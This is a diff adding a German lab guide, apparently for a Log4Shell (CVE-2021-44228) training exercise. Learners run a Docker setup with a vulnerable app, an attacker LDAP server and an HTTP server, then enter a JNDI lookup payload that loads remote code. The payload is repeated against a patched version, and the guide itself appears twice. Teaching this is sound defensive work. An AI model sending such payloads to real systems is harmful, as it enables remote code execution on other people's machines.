@@ -1,0 +1,434 @@
+<h1 id="log4shell-übungsanleitung">Log4Shell Übungsanleitung</h1>
+<h2 id="allgemeines-angriff">Allgemeines / Angriff</h2>
+<h3 id="log4j">Log4J</h3>
+<p>Log4J ist eine Java-Bibliothek, die Softwareentwicklern dabei hilft,
+Fehler und Prozesse in einer Software zu verfolgen. Es erfasst und
+speichert Fehlerberichte oder Zwischenergebnisse, die als “Logs”
+bezeichnet werden. Diese Logs können später eingesehen werden, um besser
+zu verstehen, wie die Software in bestimmten Situationen reagiert hat.
+Log4j läuft auf der freien Open Source Software der Apache Software
+Foundation und gilt als Vorreiter für Login-Frameworks und wird in den
+meisten Java basierten Programmen als Standard verwendet.</p>
+<h3 id="log4shell">Log4Shell</h3>
+<p>Die Schwachstelle in Log4j wird als Log4Shell oder CVE-2021-44228
+bezeichnet und wurde Ende 2021 bekannt gemacht. Sie basiert auf einer
+Injektionsschwachstelle in dem Java-Logging-Framework Log4j. Ein
+Angreifer könnte diese Schwachstelle nutzen und damit einzelne Programme
+ausführen oder gar das System vollständig übernehmen. Dadurch könnte zum
+Beispiel weitere Schadsoftware nachgeladen oder vertrauliche Daten aus
+dem System geschöpft werden.</p>
+<h3 id="hilfreiche-unix-befehle">Hilfreiche Unix Befehle</h3>
+<ul>
+<li><strong>bash [Option] [Befehl]</strong>: Führt ein Befehl in der
+Bash Konsole aus
+<ul>
+<li>bash -c “&lt;-Befehl&gt;”</li>
+<li>bash ./<ausführbare_datei></li>
+</ul></li>
+<li><strong>ls [Option]</strong>: Steht für “list”, zeigt den Inhalt
+eines Verzeichnisses an
+<ul>
+<li>ls -l —&gt; zeigt weitere Informationen zum Inhalt an (z.B.
+Dateirechte)</li>
+<li>ls -la —&gt; zeigt auch versteckte Dateien (z.B. Dateien die mit
+einem “.” beginnen)</li>
+<li>ls -R —&gt; zeigt rekursiv auch den Inhalt von Unterordnern an</li>
+</ul></li>
+<li><strong>cd [Verzeichnis(-Pfad)]</strong>: Steht für “change
+directory”, z.dt. “Verzeichnis wechseln”
+<ul>
+<li>cd .. —&gt; wechselt bspw. in das übergeordnete Verzeichnis</li>
+</ul></li>
+<li><strong>rm</strong> <strong>[Option]</strong>
+<strong>[Datei/Verzeichnis]</strong>: Löscht eine Datei oder ein
+Verzeichnis
+<ul>
+<li>rm [Datei] —&gt; löscht eine Datei</li>
+<li>rm -rf [Verzeichnis] —&gt; löscht Verzeichnis rekursiv und ohne
+Nachfrage</li>
+</ul></li>
+<li><strong>cat [Datei(-Pfad)]</strong>: Kann dazu genutzt werden um den
+Inhalt einer Datei auszugeben</li>
+<li><strong>./<Datei></strong>: Führt die Datei aus</li>
+</ul>
+<h2 id="log4shell-versuch---teil-1">Log4Shell Versuch - Teil 1</h2>
+<h3 id="komponenten">Komponenten</h3>
+<ul>
+<li><strong>translatorapp</strong></li>
+</ul>
+<p>Die Anwendung TranslatorApp dient Übersetzungprogramm. Der Nutzer
+kann die Anwendung nutzen, um deutsche Begriffe einzugeben, die dann ins
+Englische übersetzt und ausgegeben werden. Bei Wörtern deren Übersetzung
+in der Anwendung noch nicht existieren, erscheint eine Information, dass
+daran gearbeitet wird. Die Anwendung ist eine Java-Anwendung und
+verwendet zum Loggen der Benutzereingaben das Java-Framework Log4J. Die
+Anwendung logt die Benutzereingaben, um Rückschlüsse zu ziehen, welche
+Eingaben erfolgreich übersetzt werden konnten und wo noch
+Verbesserungspotential für die Anwendung herrscht. Die für die
+Sicherheitslücke Log4Shell benötigte Log4J-Version (2.14.1) wird hier
+verwendet.</p>
+<ul>
+<li><strong>httpserver</strong></li>
+</ul>
+<p>Der HTTP-server nimmt Anfragen von der Wanwendung entgegen und wird
+vom Angreifer kontrolliert. Er liefert beispielsweise Schadcode zurück
+und sorgt dafür, dass der Angreifer diesen Code beim Opfer einschleust.
+HTTP-Server hostet .class-Dateien, die für eine Remote-Code-Ausführung
+verwendet werden.</p>
+<ul>
+<li><strong>ldapserver</strong></li>
+</ul>
+<p>Ein LDAP-Server ist ein Verzeichnisdienst und fungiert im Prinzip wie
+ein Telefonbuch: er kann Einträge von Benutzern oder Konfigurationen,
+aber auch IP-Adressen von beispielsweise Datenbanken enthalten. Der
+LDAP-Referral-Server leitet bestimmte LDAP-Abfragen an den HTTP-Server
+weiter.</p>
+<h3 id="aufbau-der-übung">Aufbau der Übung</h3>
+<h4 id="einführung">Einführung</h4>
+<p>In diesem Versuch werden sie die verwundbare Anwendung
+‘TranslatorApp’ durch eine Injektionsschwachstelle angreifen und können
+so Schadcode auf der Anwendung ausführen lassen.</p>
+<h5 id="docker-compose">1. Docker-compose</h5>
+<p>Der Versuch beginnt damit, dass die benötigten Docker-Container
+erstellt und gestartet werden. Der folgende Befehl führt die
+docker-compose.yml Datei aus und lässt mit (-d: detached) die Container
+im Hintergrund laufen:</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker-compose up <span class="at">-d</span></span></code></pre></div>
+<p>Mit dem folgenden Befehl kannst du überprüfen ob deine Container alle
+laufen und wie deren Container-Namen lauten:</p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker-compose ps</span></code></pre></div>
+<p>Hinweis: Falls du hier nicht weiterkommst, solltest du überprüfen, ob
+du dich im richtigen Ordner befindest.</p>
+<h5 id="anwendung-im-interaktiven-modus-starten">2. Anwendung im
+interaktiven Modus starten</h5>
+<p>Da nun die Container alle im Hintergrund laufen und wir eine Shell
+für unsere Anwendung ‘TranslatorApp’ benötigen, muss die Shell für die
+TranslatorApp mit folgendem Befehl gestartet werden:</p>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker exec <span class="at">-it</span> <span class="op">&lt;</span>container_name<span class="op">&gt;</span> java <span class="at">-cp</span> /root/dependencies/<span class="pp">*</span>:/root <span class="op">&lt;</span>Dateiname<span class="op">&gt;</span></span></code></pre></div>
+<h5 id="anwendung-ausprobieren">3. Anwendung ausprobieren</h5>
+<p>Jetzt kann die Anwendung ganz normal ausprobiert werden. Du kannst
+die Wörter (Hallo, Welt, Hund, Apfel, Stuhl) eingeben und bekommst die
+Übersetzung ins englische ausgegeben.</p>
+<h5 id="log-des-httpservers-öffnen">4. Log des HTTPServers öffnen</h5>
+<p>Bevor es zum eigentlichen Angriff kommt, solltest du die Log deines
+HTTP-Server-Containers starten. Hier wirst du sehen, dass der
+HTTP-Server auf port 8080 läuft. Sobald du nun im 5. Schritt den Exploit
+durchführst, kannst du hier sehen, dass der HTTP-Server eine
+HTTP-Request der Opfer-Anwendung ‘TranslatorApp’ erhält.</p>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker logs <span class="at">-f</span> <span class="op">&lt;</span>container_name<span class="op">&gt;</span></span></code></pre></div>
+<h5 id="exploit">5. Exploit</h5>
+<p>Um den Log4Shell-Angriff durchführen zu können, musst du in das
+Eingabefeld einen präparierten JNDI-Befehl eingeben.</p>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="va">${jndi</span><span class="op">:</span>ldap<span class="op">:</span>//&lt;HOSTNAME_LDAP&gt;<span class="op">:</span>&lt;PORTNUMMER_LDAP&gt;/cn=BadCode,dc=src<span class="va">}</span></span></code></pre></div>
+<p>Falls du den präparierten JNDI-Befehl richtig eingegeben hast, sollte
+jetzt der Schadcode auf der Anwendung ausgeführt und du solltest eine
+Ausgabe in Dauerschleife sehen. Mit der Tastenkombination ‘STRG’ + ‘C’
+kannst du die Container-Shell beenden. Der HTTP-Server sollte nun die
+Nachricht ausgeben, dass eine Request der Opferanwendung angekommen ist
+und eine Response an die Opferanwendung rausgeschickt wurde.</p>
+<p>Hinweis: Den Hostnamen und den Port des LDAP-Servers findest du
+innerhalb einer Datei in den Verzeichnissen des Versuchs.</p>
+<h5 id="log-file-der-anwendung-auslesen">6. Log-File der Anwendung
+auslesen</h5>
+<p>Die Anwendung erstellt eine log-file, in der die Logs gespeichert
+werden. Diese log-file kannst du auslesen in dem du dich langsam mit dem
+Befehl ‘ls’ in die Verzeichnisse rantastest.</p>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> exec <span class="at">-it</span> <span class="op">&lt;</span>container_name<span class="op">&gt;</span> ls /root</span></code></pre></div>
+<p>Du solltest nun den Ordner ‘logs’ angezeigt bekommen. Passe deinen
+Befehl oben so an, dass du nun den Inhalt des Ordners ‘logs’ angezeigt
+bekommst. Nun kannst du mit dem Befehl ‘cat’ die log-file auslesen. In
+der log-file sollte der JNDI-Lookup nur als String mitgeloggt
+werden.</p>
+<p><strong>Sie haben nun das Ende der Log4Shell-Übung Teil 1/2
+erreicht.</strong></p>
+<h2 id="log4shell-versuch---teil-2">Log4Shell Versuch - Teil 2</h2>
+<h3 id="komponenten-1">Komponenten</h3>
+<p>Die Komponenten sind die gleichen wie im ersten Teil der Übung. Die
+einzige Änderung ist in der Komponente ‘translatorapp’. Dort wird jetzt
+im zweiten Teil der Übung die Log4J-Version (2.20.0) verwendet. Diese
+Log4J-Version ist die gepatchte Version und ermöglicht keine
+JNDI-Lookups mehr. Somit schließt es die Sicherheitslücke im
+Log4J-Framework.</p>
+<h3 id="aufbau-der-übung-1">Aufbau der Übung</h3>
+<h4 id="einführung-1">Einführung</h4>
+<p>In diesem Versuch werden sie versuchen, die Anwendung ‘TranslatorApp’
+durch eine Injektionsschwachstelle anzugreifen und Schadcode auf der
+Anwendung ausführen zu lassen. Beachte, dass du jetzt in das richtige
+Verzeichnis wechselst. Du solltest dich im Ordner “Log4Shellgepatcht”
+befinden.</p>
+<h5 id="docker-compose-1">1. Docker-compose</h5>
+<p>Der Versuch beginnt damit, dass die benötigten Docker-Container
+erstellt und gestartet werden. Der folgende Befehl führt die
+docker-compose.yml Datei aus und lässt mit (-d: detached) die Container
+im Hintergrund laufen:</p>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker-compose up <span class="at">-d</span></span></code></pre></div>
+<p>Mit dem folgenden Befehl kannst du überprüfen ob deine Container alle
+laufen und wie deren Container-Namen lauten:</p>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker-compose ps</span></code></pre></div>
+<p>Hinweis: Falls du hier nicht weiterkommst, solltest du überprüfen, ob
+du dich im richtigen Ordner befindest.</p>
+<h5 id="anwendung-im-interaktiven-modus-starten-1">2. Anwendung im
+interaktiven Modus starten</h5>
+<p>Da nun die Container alle im Hintergrund laufen und wir eine Shell
+für unsere Anwendung ‘TranslatorApp’ benötigen, muss die Shell für die
+TranslatorApp mit folgendem Befehl gestartet werden:</p>
+<div class="sourceCode" id="cb9"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker exec <span class="at">-it</span> <span class="op">&lt;</span>container_name<span class="op">&gt;</span> java <span class="at">-cp</span> /root/dependencies/<span class="pp">*</span>:/root <span class="op">&lt;</span>Dateiname<span class="op">&gt;</span></span></code></pre></div>
+<h5 id="log-des-httpservers-öffnen-1">3. Log des HTTPServers öffnen</h5>
+<p>Bevor es zum Versuch des Angriff kommt, solltest du die Log deines
+HTTP-Server-Containers starten. Hier wirst du sehen, dass der
+HTTP-Server auf port 8080 läuft. Sobald du nun im 4. Schritt versuchst
+den Exploit durchzuführen, kannst du hier sehen dass der HTTP-Server
+läuft, aber nie eine HTTP-Request von der Opferanwendung erhalten
+wird.</p>
+<div class="sourceCode" id="cb10"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker logs <span class="at">-f</span> <span class="op">&lt;</span>container_name<span class="op">&gt;</span></span></code></pre></div>
+<h5 id="exploit-1">4. Exploit</h5>
+<p>Um die Anwendung auf eine Sicherheitslücke zu untersuchen, gibst du
+nun den selben präparierten JNDI-Befehl wie im ersten Teil der Übung
+ein.</p>
+<div class="sourceCode" id="cb11"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="va">${jndi</span><span class="op">:</span>ldap<span class="op">:</span>//&lt;HOSTNAME_LDAP&gt;<span class="op">:</span>&lt;PORTNUMMER_LDAP&gt;/cn=BadCode,dc=src<span class="va">}</span></span></code></pre></div>
+<p>Falls du den präparierten JNDI-Befehl richtig eingegeben hast, sollte
+jetzt der Schadcode NICHT auf der Anwendung ausgeführt werden.</p>
+<p>Hinweis: Den Hostnamen und den Port des LDAP-Servers findest du
+innerhalb einer Datei in den Verzeichnissen des Versuchs.</p>
+<h5 id="log-file-der-anwendung-auslesen-1">6. Log-File der Anwendung
+auslesen</h5>
+<p>Die Anwendung erstellt eine log-file, in der die Logs gespeichert
+werden. Diese log-file kannst du auslesen in dem du dich langsam mit dem
+Befehl ‘ls’ in die Verzeichnisse rantastest.</p>
+<div class="sourceCode" id="cb12"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> exec <span class="at">-it</span> <span class="op">&lt;</span>container_name<span class="op">&gt;</span> ls /root</span></code></pre></div>
+<p>Du solltest nun den Ordner ‘logs’ angezeigt bekommen. Passe deinen
+Befehl oben so an, dass du nun den Inhalt des Ordners ‘logs’ angezeigt
+bekommst. Nun kannst du mit dem Befehl ‘cat’ die log-file auslesen. In
+der log-file sollte der JNDI-Lookup nur als String mitgeloggt
+werden.</p>
+<p><strong>Sie haben nun das Ende der Log4Shell-Übung Teil 2/2
+erreicht.</strong></p>
+<h1 id="log4shell-übungsanleitung-1">Log4Shell Übungsanleitung</h1>
+<h2 id="allgemeines-angriff-1">Allgemeines / Angriff</h2>
+<h3 id="log4j-1">Log4J</h3>
+<p>Log4J ist eine Java-Bibliothek, die Softwareentwicklern dabei hilft,
+Fehler und Prozesse in einer Software zu verfolgen. Es erfasst und
+speichert Fehlerberichte oder Zwischenergebnisse, die als “Logs”
+bezeichnet werden. Diese Logs können später eingesehen werden, um besser
+zu verstehen, wie die Software in bestimmten Situationen reagiert hat.
+Log4j läuft auf der freien Open Source Software der Apache Software
+Foundation und gilt als Vorreiter für Login-Frameworks und wird in den
+meisten Java basierten Programmen als Standard verwendet.</p>
+<h3 id="log4shell-1">Log4Shell</h3>
+<p>Die Schwachstelle in Log4j wird als Log4Shell oder CVE-2021-44228
+bezeichnet und wurde Ende 2021 bekannt gemacht. Sie basiert auf einer
+Injektionsschwachstelle in dem Java-Logging-Framework Log4j. Ein
+Angreifer könnte diese Schwachstelle nutzen und damit einzelne Programme
+ausführen oder gar das System vollständig übernehmen. Dadurch könnte zum
+Beispiel weitere Schadsoftware nachgeladen oder vertrauliche Daten aus
+dem System geschöpft werden.</p>
+<h3 id="hilfreiche-unix-befehle-1">Hilfreiche Unix Befehle</h3>
+<ul>
+<li><strong>bash [Option] [Befehl]</strong>: Führt ein Befehl in der
+Bash Konsole aus
+<ul>
+<li>bash -c “&lt;-Befehl&gt;”</li>
+<li>bash ./<ausführbare_datei></li>
+</ul></li>
+<li><strong>ls [Option]</strong>: Steht für “list”, zeigt den Inhalt
+eines Verzeichnisses an
+<ul>
+<li>ls -l —&gt; zeigt weitere Informationen zum Inhalt an (z.B.
+Dateirechte)</li>
+<li>ls -la —&gt; zeigt auch versteckte Dateien (z.B. Dateien die mit
+einem “.” beginnen)</li>
+<li>ls -R —&gt; zeigt rekursiv auch den Inhalt von Unterordnern an</li>
+</ul></li>
+<li><strong>cd [Verzeichnis(-Pfad)]</strong>: Steht für “change
+directory”, z.dt. “Verzeichnis wechseln”
+<ul>
+<li>cd .. —&gt; wechselt bspw. in das übergeordnete Verzeichnis</li>
+</ul></li>
+<li><strong>rm</strong> <strong>[Option]</strong>
+<strong>[Datei/Verzeichnis]</strong>: Löscht eine Datei oder ein
+Verzeichnis
+<ul>
+<li>rm [Datei] —&gt; löscht eine Datei</li>
+<li>rm -rf [Verzeichnis] —&gt; löscht Verzeichnis rekursiv und ohne
+Nachfrage</li>
+</ul></li>
+<li><strong>cat [Datei(-Pfad)]</strong>: Kann dazu genutzt werden um den
+Inhalt einer Datei auszugeben</li>
+<li><strong>./<Datei></strong>: Führt die Datei aus</li>
+</ul>
+<h2 id="log4shell-versuch---teil-1-1">Log4Shell Versuch - Teil 1</h2>
+<h3 id="komponenten-2">Komponenten</h3>
+<ul>
+<li><strong>translatorapp</strong></li>
+</ul>
+<p>Die Anwendung TranslatorApp dient Übersetzungprogramm. Der Nutzer
+kann die Anwendung nutzen, um deutsche Begriffe einzugeben, die dann ins
+Englische übersetzt und ausgegeben werden. Bei Wörtern deren Übersetzung
+in der Anwendung noch nicht existieren, erscheint eine Information, dass
+daran gearbeitet wird. Die Anwendung ist eine Java-Anwendung und
+verwendet zum Loggen der Benutzereingaben das Java-Framework Log4J. Die
+Anwendung logt die Benutzereingaben, um Rückschlüsse zu ziehen, welche
+Eingaben erfolgreich übersetzt werden konnten und wo noch
+Verbesserungspotential für die Anwendung herrscht. Die für die
+Sicherheitslücke Log4Shell benötigte Log4J-Version (2.14.1) wird hier
+verwendet.</p>
+<ul>
+<li><strong>httpserver</strong></li>
+</ul>
+<p>Der HTTP-server nimmt Anfragen von der Wanwendung entgegen und wird
+vom Angreifer kontrolliert. Er liefert beispielsweise Schadcode zurück
+und sorgt dafür, dass der Angreifer diesen Code beim Opfer einschleust.
+HTTP-Server hostet .class-Dateien, die für eine Remote-Code-Ausführung
+verwendet werden.</p>
+<ul>
+<li><strong>ldapserver</strong></li>
+</ul>
+<p>Ein LDAP-Server ist ein Verzeichnisdienst und fungiert im Prinzip wie
+ein Telefonbuch: er kann Einträge von Benutzern oder Konfigurationen,
+aber auch IP-Adressen von beispielsweise Datenbanken enthalten. Der
+LDAP-Referral-Server leitet bestimmte LDAP-Abfragen an den HTTP-Server
+weiter.</p>
+<h3 id="aufbau-der-übung-2">Aufbau der Übung</h3>
+<h4 id="einführung-2">Einführung</h4>
+<p>In diesem Versuch werden sie die verwundbare Anwendung
+‘TranslatorApp’ durch eine Injektionsschwachstelle angreifen und können
+so Schadcode auf der Anwendung ausführen lassen.</p>
+<h5 id="docker-compose-2">1. Docker-compose</h5>
+<p>Der Versuch beginnt damit, dass die benötigten Docker-Container
+erstellt und gestartet werden. Der folgende Befehl führt die
+docker-compose.yml Datei aus und lässt mit (-d: detached) die Container
+im Hintergrund laufen:</p>
+<div class="sourceCode" id="cb13"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker-compose up <span class="at">-d</span></span></code></pre></div>
+<p>Mit dem folgenden Befehl kannst du überprüfen ob deine Container alle
+laufen und wie deren Container-Namen lauten:</p>
+<div class="sourceCode" id="cb14"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker-compose ps</span></code></pre></div>
+<p>Hinweis: Falls du hier nicht weiterkommst, solltest du überprüfen, ob
+du dich im richtigen Ordner befindest.</p>
+<h5 id="anwendung-im-interaktiven-modus-starten-2">2. Anwendung im
+interaktiven Modus starten</h5>
+<p>Da nun die Container alle im Hintergrund laufen und wir eine Shell
+für unsere Anwendung ‘TranslatorApp’ benötigen, muss die Shell für die
+TranslatorApp mit folgendem Befehl gestartet werden:</p>
+<div class="sourceCode" id="cb15"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker exec <span class="at">-it</span> <span class="op">&lt;</span>container_name<span class="op">&gt;</span> java <span class="at">-cp</span> /root/dependencies/<span class="pp">*</span>:/root <span class="op">&lt;</span>Dateiname<span class="op">&gt;</span></span></code></pre></div>
+<h5 id="anwendung-ausprobieren-1">3. Anwendung ausprobieren</h5>
+<p>Jetzt kann die Anwendung ganz normal ausprobiert werden. Du kannst
+die Wörter (Hallo, Welt, Hund, Apfel, Stuhl) eingeben und bekommst die
+Übersetzung ins englische ausgegeben.</p>
+<h5 id="log-des-httpservers-öffnen-2">4. Log des HTTPServers öffnen</h5>
+<p>Bevor es zum eigentlichen Angriff kommt, solltest du die Log deines
+HTTP-Server-Containers starten. Hier wirst du sehen, dass der
+HTTP-Server auf port 8080 läuft. Sobald du nun im 5. Schritt den Exploit
+durchführst, kannst du hier sehen, dass der HTTP-Server eine
+HTTP-Request der Opfer-Anwendung ‘TranslatorApp’ erhält.</p>
+<div class="sourceCode" id="cb16"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker logs <span class="at">-f</span> <span class="op">&lt;</span>container_name<span class="op">&gt;</span></span></code></pre></div>
+<h5 id="exploit-2">5. Exploit</h5>
+<p>Um den Log4Shell-Angriff durchführen zu können, musst du in das
+Eingabefeld einen präparierten JNDI-Befehl eingeben.</p>
+<div class="sourceCode" id="cb17"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="va">${jndi</span><span class="op">:</span>ldap<span class="op">:</span>//&lt;HOSTNAME_LDAP&gt;<span class="op">:</span>&lt;PORTNUMMER_LDAP&gt;/cn=BadCode,dc=src<span class="va">}</span></span></code></pre></div>
+<p>Falls du den präparierten JNDI-Befehl richtig eingegeben hast, sollte
+jetzt der Schadcode auf der Anwendung ausgeführt und du solltest eine
+Ausgabe in Dauerschleife sehen. Mit der Tastenkombination ‘STRG’ + ‘C’
+kannst du die Container-Shell beenden. Der HTTP-Server sollte nun die
+Nachricht ausgeben, dass eine Request der Opferanwendung angekommen ist
+und eine Response an die Opferanwendung rausgeschickt wurde.</p>
+<p>Hinweis: Den Hostnamen und den Port des LDAP-Servers findest du
+innerhalb einer Datei in den Verzeichnissen des Versuchs.</p>
+<h5 id="log-file-der-anwendung-auslesen-2">6. Log-File der Anwendung
+auslesen</h5>
+<p>Die Anwendung erstellt eine log-file, in der die Logs gespeichert
+werden. Diese log-file kannst du auslesen in dem du dich langsam mit dem
+Befehl ‘ls’ in die Verzeichnisse rantastest.</p>
+<div class="sourceCode" id="cb18"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> exec <span class="at">-it</span> <span class="op">&lt;</span>container_name<span class="op">&gt;</span> ls /root</span></code></pre></div>
+<p>Du solltest nun den Ordner ‘logs’ angezeigt bekommen. Passe deinen
+Befehl oben so an, dass du nun den Inhalt des Ordners ‘logs’ angezeigt
+bekommst. Nun kannst du mit dem Befehl ‘cat’ die log-file auslesen. In
+der log-file sollte der JNDI-Lookup nur als String mitgeloggt
+werden.</p>
+<p><strong>Sie haben nun das Ende der Log4Shell-Übung Teil 1/2
+erreicht.</strong></p>
+<h2 id="log4shell-versuch---teil-2-1">Log4Shell Versuch - Teil 2</h2>
+<h3 id="komponenten-3">Komponenten</h3>
+<p>Die Komponenten sind die gleichen wie im ersten Teil der Übung. Die
+einzige Änderung ist in der Komponente ‘translatorapp’. Dort wird jetzt
+im zweiten Teil der Übung die Log4J-Version (2.20.0) verwendet. Diese
+Log4J-Version ist die gepatchte Version und ermöglicht keine
+JNDI-Lookups mehr. Somit schließt es die Sicherheitslücke im
+Log4J-Framework.</p>
+<h3 id="aufbau-der-übung-3">Aufbau der Übung</h3>
+<h4 id="einführung-3">Einführung</h4>
+<p>In diesem Versuch werden sie versuchen, die Anwendung ‘TranslatorApp’
+durch eine Injektionsschwachstelle anzugreifen und Schadcode auf der
+Anwendung ausführen zu lassen. Beachte, dass du jetzt in das richtige
+Verzeichnis wechselst. Du solltest dich im Ordner “Log4Shellgepatcht”
+befinden.</p>
+<h5 id="docker-compose-3">1. Docker-compose</h5>
+<p>Der Versuch beginnt damit, dass die benötigten Docker-Container
+erstellt und gestartet werden. Der folgende Befehl führt die
+docker-compose.yml Datei aus und lässt mit (-d: detached) die Container
+im Hintergrund laufen:</p>
+<div class="sourceCode" id="cb19"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker-compose up <span class="at">-d</span></span></code></pre></div>
+<p>Mit dem folgenden Befehl kannst du überprüfen ob deine Container alle
+laufen und wie deren Container-Namen lauten:</p>
+<div class="sourceCode" id="cb20"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker-compose ps</span></code></pre></div>
+<p>Hinweis: Falls du hier nicht weiterkommst, solltest du überprüfen, ob
+du dich im richtigen Ordner befindest.</p>
+<h5 id="anwendung-im-interaktiven-modus-starten-3">2. Anwendung im
+interaktiven Modus starten</h5>
+<p>Da nun die Container alle im Hintergrund laufen und wir eine Shell
+für unsere Anwendung ‘TranslatorApp’ benötigen, muss die Shell für die
+TranslatorApp mit folgendem Befehl gestartet werden:</p>
+<div class="sourceCode" id="cb21"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker exec <span class="at">-it</span> <span class="op">&lt;</span>container_name<span class="op">&gt;</span> java <span class="at">-cp</span> /root/dependencies/<span class="pp">*</span>:/root <span class="op">&lt;</span>Dateiname<span class="op">&gt;</span></span></code></pre></div>
+<h5 id="log-des-httpservers-öffnen-3">3. Log des HTTPServers öffnen</h5>
+<p>Bevor es zum Versuch des Angriff kommt, solltest du die Log deines
+HTTP-Server-Containers starten. Hier wirst du sehen, dass der
+HTTP-Server auf port 8080 läuft. Sobald du nun im 4. Schritt versuchst
+den Exploit durchzuführen, kannst du hier sehen dass der HTTP-Server
+läuft, aber nie eine HTTP-Request von der Opferanwendung erhalten
+wird.</p>
+<div class="sourceCode" id="cb22"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> docker logs <span class="at">-f</span> <span class="op">&lt;</span>container_name<span class="op">&gt;</span></span></code></pre></div>
+<h5 id="exploit-3">4. Exploit</h5>
+<p>Um die Anwendung auf eine Sicherheitslücke zu untersuchen, gibst du
+nun den selben präparierten JNDI-Befehl wie im ersten Teil der Übung
+ein.</p>
+<div class="sourceCode" id="cb23"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="va">${jndi</span><span class="op">:</span>ldap<span class="op">:</span>//&lt;HOSTNAME_LDAP&gt;<span class="op">:</span>&lt;PORTNUMMER_LDAP&gt;/cn=BadCode,dc=src<span class="va">}</span></span></code></pre></div>
+<p>Falls du den präparierten JNDI-Befehl richtig eingegeben hast, sollte
+jetzt der Schadcode NICHT auf der Anwendung ausgeführt werden.</p>
+<p>Hinweis: Den Hostnamen und den Port des LDAP-Servers findest du
+innerhalb einer Datei in den Verzeichnissen des Versuchs.</p>
+<h5 id="log-file-der-anwendung-auslesen-3">6. Log-File der Anwendung
+auslesen</h5>
+<p>Die Anwendung erstellt eine log-file, in der die Logs gespeichert
+werden. Diese log-file kannst du auslesen in dem du dich langsam mit dem
+Befehl ‘ls’ in die Verzeichnisse rantastest.</p>
+<div class="sourceCode" id="cb24"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> exec <span class="at">-it</span> <span class="op">&lt;</span>container_name<span class="op">&gt;</span> ls /root</span></code></pre></div>
+<p>Du solltest nun den Ordner ‘logs’ angezeigt bekommen. Passe deinen
+Befehl oben so an, dass du nun den Inhalt des Ordners ‘logs’ angezeigt
+bekommst. Nun kannst du mit dem Befehl ‘cat’ die log-file auslesen. In
+der log-file sollte der JNDI-Lookup nur als String mitgeloggt
+werden.</p>
+<p><strong>Sie haben nun das Ende der Log4Shell-Übung Teil 2/2
+erreicht.</strong></p>
